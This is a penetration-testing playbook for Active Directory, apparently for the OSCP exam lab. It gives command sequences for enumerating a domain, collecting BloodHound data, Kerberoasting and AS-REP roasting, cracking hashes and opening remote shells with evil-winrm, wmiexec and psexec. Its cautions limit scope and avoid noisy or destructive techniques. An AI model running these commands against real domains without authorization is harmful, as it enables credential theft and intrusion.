# Active Directory Presumed-Breach Playbook

Use this when the control panel supplies a domain username and password. Work in short loops: validate, enumerate, form one hypothesis, test it, record the result, and re-enumerate whenever access changes.

## 0. Preflight

```bash
./scripts/oscp.sh profile ad
./scripts/oscp.sh phase enum
./scripts/oscp.sh set-target DC_IP SUBNET_CIDR
./scripts/oscp.sh focus "validate supplied AD credential"
./scripts/oscp.sh note "AD start: supplied user, DC IP, domain, control-panel objectives"
```

Confirm:

- Domain FQDN and DC hostname
- VPN route to every in-scope host
- DNS resolution through the DC where required
- Kali/DC time synchronization before Kerberos work
- Lockout policy before any multi-user authentication attempt

## 1. Validate the supplied credential

Prefer prompting for the secret so it is not saved literally in shell history:

```bash
read -r -s -p "AD password: " AD_PASS; echo
netexec smb DC_IP -d DOMAIN -u USER -p "$AD_PASS"
netexec smb DC_IP -d DOMAIN -u USER -p "$AD_PASS" --pass-pol
netexec winrm DC_IP -d DOMAIN -u USER -p "$AD_PASS"
```

Record the credential and result:

```bash
./scripts/oscp.sh add-cred ad 'DOMAIN\USER' "$AD_PASS" 'exam supplied'
./scripts/oscp.sh task done ad-creds
```

Do not spray. A supplied credential is a starting identity, not permission for blind password guessing.

## 2. Establish the domain baseline

```bash
ldapsearch -x -H ldap://DC_IP -s base namingContexts defaultNamingContext dnsHostName ldapServiceName
netexec smb DC_IP -d DOMAIN -u USER -p "$AD_PASS" --shares
netexec smb DC_IP -d DOMAIN -u USER -p "$AD_PASS" --users
netexec smb DC_IP -d DOMAIN -u USER -p "$AD_PASS" --groups
netexec smb SUBNET_CIDR -d DOMAIN -u USER -p "$AD_PASS" --shares
netexec winrm SUBNET_CIDR -d DOMAIN -u USER -p "$AD_PASS"
ldapdomaindump -u 'DOMAIN\USER' -p "$AD_PASS" ldap://DC_IP -o ad/ldapdomaindump
```

For every readable share, look for deployment scripts, configuration files, backups, database strings, unattended files, SSH keys, usernames, and service-account credentials. Recheck shares as every new identity.

## 3. Build the relationship graph

```bash
bloodhound-python -u USER -p "$AD_PASS" -d DOMAIN -ns DC_IP -c All --zip
```

Mark owned users and computers. Review:

- Shortest paths from owned principals to high-value targets
- Local-admin, WinRM, RDP, and session edges
- Group membership and nested groups
- `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, and `AllExtendedRights`
- Kerberoastable and AS-REP roastable users
- GPO control, delegation, AD CS, and DCSync rights

Do not execute an edge merely because BloodHound displays it. Open the edge help, understand the prerequisite and side effect, and capture why it is justified.

## 4. Check credential opportunities

Kerberoasting with a valid user:

```bash
impacket-GetUserSPNs 'DOMAIN/USER' -dc-ip DC_IP -request -outputfile ad/kerberoast.txt
hashcat -m 13100 ad/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

AS-REP roasting is justified only after you have a defensible username list:

```bash
impacket-GetNPUsers 'DOMAIN/' -dc-ip DC_IP -usersfile ad/users.txt -request -outputfile ad/asrep.txt
hashcat -m 18200 ad/asrep.txt /usr/share/wordlists/rockyou.txt
```

If Kerberos fails unexpectedly, verify name resolution and compare local time with the DC before changing tools.

## 5. Reuse credentials deliberately

For each new password or hash:

1. Log its user, source, host, and privilege context.
2. Test only relevant in-scope hosts and exposed protocols.
3. Record successful and failed authentication separately.
4. Re-run share, group, session, and BloodHound analysis as the new identity.

Useful shell paths after authorization is demonstrated:

```bash
evil-winrm -i HOST -u USER -p "$AD_PASS"
impacket-wmiexec 'DOMAIN/USER'@HOST
impacket-psexec 'DOMAIN/USER'@HOST
```

## 6. On every new Windows shell

```text
whoami /all
hostname
ipconfig /all
net user /domain
net group "Domain Admins" /domain
dir C:\Users
```

Then:

- Check local privilege escalation before assuming lateral movement is required.
- Look for another network interface or route that explains an unreachable AD host.
- Collect evidence before modifying the system.
- Update the phase and focus: `phase privesc`, `phase lateral`, or `phase proof`.

## 7. Evidence loop

After each meaningful change, write one note containing:

- What changed
- Exact command
- Concise result
- Evidence/output path
- New access level
- Next hypothesis

```bash
./scripts/oscp.sh note "HOST: USER gained WinRM; source=share/config.xml; next=local enum"
./scripts/oscp.sh focus "enumerate HOST as DOMAIN\\USER"
./scripts/oscp.sh guide
```

## Avoid in the default exam path

- Responder poisoning or spoofing
- Blind password spraying or hash-to-user cartesian products
- Online hash-submission services
- Memory-only loaders, security-control bypasses, or stealth tooling
- Golden/silver tickets, skeleton keys, custom SSPs, or persistence unless an explicit objective requires them
- Destructive domain changes when a quieter, reversible proof is available

Use `./scripts/oscp.sh reference advanced-ad` only when collected evidence points to a specific advanced path.
